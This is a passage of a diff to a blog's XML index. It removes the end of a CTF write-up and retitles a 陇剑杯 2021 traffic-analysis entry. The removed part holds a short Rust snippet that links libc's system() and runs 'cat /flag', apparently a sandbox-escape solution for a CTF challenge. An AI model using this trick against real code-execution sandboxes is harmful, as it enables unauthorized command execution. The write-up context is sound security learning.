-<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">fn</span> <span class="title function_">system</span>(s: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">	<span class="keyword">unsafe</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">b&quot;cat /flag&quot;</span> <span class="keyword">as</span> *<span class="keyword">const</span> <span class="type">u8</span>)</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>比赛</tag>
       </tags>
   </entry>
   <entry>
@@ -3353,7 +3551,7 @@
       </tags>
   </entry>
   <entry>
-    <title>陇剑杯2021</title>
+    <title>陇剑杯 2021</title>
     <url>/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html</url>
     <content><![CDATA[<p>记录陇剑杯的流量分析题</p>
 <span id="more"></span>
